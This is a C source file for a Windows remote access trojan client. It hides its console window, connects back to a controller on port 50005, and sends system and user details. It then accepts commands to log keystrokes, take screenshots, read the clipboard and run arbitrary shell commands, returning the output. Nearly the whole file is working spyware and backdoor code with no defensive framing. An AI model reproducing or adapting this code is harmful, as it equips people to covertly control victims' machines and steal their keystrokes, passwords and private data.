#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <lmcons.h>
#include <stdint.h>
#include <time.h>

#include "system.h"
#include "../functions/keylogger.h"
#include "screenshot.h"

void start_sockets();

SOCKET sock;

char buffer[1024];
char response[1024];
char message[20000];

void talk(struct addrinfo* client) {
    char cpuBuffer[1024];
    print_cpu_details(cpuBuffer);
    send(sock, cpuBuffer, sizeof(cpuBuffer), 0);

    char memoryBuffer[1024];
    print_memory_details(memoryBuffer);
    send(sock, memoryBuffer, sizeof(memoryBuffer), 0);

    char userBuffer[UNLEN + 1];
    print_user_details(userBuffer);
    printf("%s\n", userBuffer);
    send(sock, userBuffer, sizeof(userBuffer), 0);

    // char diskBuffer[1024];
    // print_disk_space(diskBuffer);
    // send(sock, diskBuffer, sizeof(diskBuffer), 0);

    while (1) {
        ZeroMemory(buffer, sizeof(buffer));
        ZeroMemory(response, sizeof(response));

        int recvBytes = recv(sock, buffer, sizeof(buffer), 0);

        if ((recvBytes == SOCKET_ERROR && WSAGetLastError() == WSAECONNRESET) || !strcmp(buffer, "reset")) {
            printf("Client Disconnected\n");
            freeaddrinfo(client);
            closesocket(sock);
            WSACleanup();
            start_sockets();
        } else if (buffer[0] == 'c' && buffer[1] == 'd') {
            char* cdBuffer = buffer;
            SetCurrentDirectory(cdBuffer + 3);
            sprintf(message, "Current Directory: %s", cdBuffer + 3);
            send(sock, message, sizeof(message), 0);
        } else if (buffer[0] == 'k' && buffer[1] == 'l') {
            printf("keylogging on server\n");
            change_active(1);
            keylogger(sock);
        } else if (buffer[0] == 'k' && buffer[1] == 's') {
            printf("unlogging\n");
            change_active(0);
        } else if (buffer[0] == 's' && buffer[1] == 's') {
            take_screenshot("ss.bmp", sock);
        } else if (buffer[0] == 'c' && buffer[1] == 'c') {
            if (!OpenClipboard(NULL)) continue;

            HANDLE clip = GetClipboardData(CF_TEXT);
            if (clip == NULL) {
                CloseClipboard();
                continue;
            }

            ZeroMemory(message, sizeof(message));

            sprintf(message, "Current Clipboard: %s", clip);
            CloseClipboard();
            send(sock, message, sizeof(message), 0);
        } else {
            FILE* file = popen(buffer, "r");
            printf("%d\n", strcmp(buffer, "restart"));
            if (strcmp(buffer, "restart") == 0) {
                printf("Client Disconnected\n");
                freeaddrinfo(client);
                closesocket(sock);
                WSACleanup();
                start_sockets();
            }

            while (fgets(response, sizeof(response), file)) {
                strcat(message, response);
            }
            send(sock, message, sizeof(message), 0);
        }
    }

}

void start_sockets() {
    WSADATA wsaData;
    ZeroMemory(&wsaData, sizeof(wsaData));

    struct addrinfo hints;
    struct addrinfo* server;
    ZeroMemory(&hints, sizeof(hints));

    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        printf("WSAStartup failed with error: %d\n", WSAGetLastError());
        Sleep(5000);
        exit(1);
    }

    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    if (getaddrinfo("localhost", "50005", &hints, &server) != 0) {
        printf("Getaddrinfo failed with error: %d\n", WSAGetLastError());
        Sleep(5000);
        WSACleanup();
        exit(1);
    }

    sock = socket(server->ai_family, server->ai_socktype, server->ai_protocol);
    if (sock == INVALID_SOCKET) {
        printf("Socket failed with error: %d\n", WSAGetLastError());
        Sleep(5000);
        WSACleanup();
        exit(1);
    }

    while(connect(sock, server->ai_addr, server->ai_addrlen) != 0) {
        printf("Trynig to connect\n");
        Sleep(5000);
    }

    printf("Client connected\n");

    talk(server);
}

int main(void) {

    char log[MAX_PATH];

    time_t t = time(NULL);
    struct tm tm = *localtime(&t);
    sprintf(log, "Log Taken: : %d-%02d-%02d %02d:%02d:%02d\n", tm.tm_year + 1900, tm.tm_mon + 1, tm.tm_mday, tm.tm_hour, tm.tm_min, tm.tm_sec);
    sprintf(log, "log.txt");
    sprintf(log, "\n");

    ShowWindow(GetConsoleWindow(), SW_HIDE);

    start_sockets();

    return 0;

}

